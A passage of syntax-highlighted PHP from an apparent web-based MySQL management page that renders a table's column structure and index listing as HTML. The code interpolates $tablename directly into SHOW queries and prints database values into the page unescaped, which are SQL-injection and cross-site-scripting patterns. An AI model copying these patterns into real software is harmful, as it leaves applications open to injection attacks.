<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;/form&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">tablename</span> || (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">runquery</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sql_query</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">doing</span> == <span style="color: #8abeb7;">'structure'</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">result</span> = q(<span style="color: #8abeb7;">"SHOW FULL COLUMNS FROM </span><span style="color: #f0c674;">$tablename</span><span style="color: #8abeb7;">"</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">rowdb</span> = <span style="color: #b5bd68;">array</span>();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">while</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span> = mysql_fetch_array(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">result</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">rowdb</span>[] = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;h3&gt;Structure&lt;/h3&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;table border="0" cellpadding="3" cellspacing="0"&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;tr class="head"&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;Field&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;Type&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;Collation&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;Null&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;Key&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;Default&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;Extra&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;Privileges&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;Comment&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;/tr&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">rowdb</span> <span style="color: #b5bd68;">as</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #81a2be;">this</span>bg = bg();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;tr class="'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #81a2be;">this</span>bg.<span style="color: #8abeb7;">'" onmouseover="this.className=\</span><span style="color: #8abeb7; text-decoration: underline;">'focus\';" onmouseout="this.className=\''</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #81a2be; text-decoration: underline;">this</span><span style="text-decoration: underline;">bg.</span><span style="color: #8abeb7; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Field'</span>].<span style="color: #8abeb7;">'&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Type'</span>].<span style="color: #8abeb7;">'&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Collation'</span>].<span style="color: #8abeb7;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Null'</span>].<span style="color: #8abeb7;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Key'</span>].<span style="color: #8abeb7;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Default'</span>].<span style="color: #8abeb7;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Extra'</span>].<span style="color: #8abeb7;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Privileges'</span>].<span style="color: #8abeb7;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Comment'</span>].<span style="color: #8abeb7;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;/tr&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   tbfoot();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">result</span> = q(<span style="color: #8abeb7;">"SHOW INDEX FROM </span><span style="color: #f0c674;">$tablename</span><span style="color: #8abeb7;">"</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">rowdb</span> = <span style="color: #b5bd68;">array</span>();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">while</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span> = mysql_fetch_array(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">result</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">rowdb</span>[] = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;h3&gt;Indexes&lt;/h3&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;table border="0" cellpadding="3" cellspacing="0"&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;tr class="head"&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;Keyname&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;Type&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;Unique&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;Packed&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;Seq_in_index&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;Field&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;Cardinality&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;Collation&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;Null&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;Comment&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;/tr&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">foreach</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">rowdb</span> <span style="color: #b5bd68;">as</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #81a2be;">this</span>bg = bg();
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;tr class="'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #81a2be;">this</span>bg.<span style="color: #8abeb7;">'" onmouseover="this.className=\</span><span style="color: #8abeb7; text-decoration: underline;">'focus\';" onmouseout="this.className=\''</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #81a2be; text-decoration: underline;">this</span><span style="text-decoration: underline;">bg.</span><span style="color: #8abeb7; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Key_name'</span>].<span style="color: #8abeb7;">'&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Index_type'</span>].<span style="color: #8abeb7;">'&lt;/td&gt;'</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;'</span>.(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Non_unique'</span>] ? <span style="color: #8abeb7;">'No'</span> : <span style="color: #8abeb7;">'Yes'</span>).<span style="color: #8abeb7;">'&amp;nbsp;&lt;/td</span><span style="color: #8abeb7; text-decoration: underline;">&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   p(<span style="color: #8abeb7;">'&lt;td&gt;'</span>.(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Packed'</span>] === <span style="color: #81a2be;">null</span> ? <span style="color: #8abeb7;">'No'</span> : <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">row</span>[<span style="color: #8abeb7;">'Packed'</span><span style="text-decoration: underline;">]).</span><span style="color: #8abeb7; text-decoration: underline;">'&amp;nbsp;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
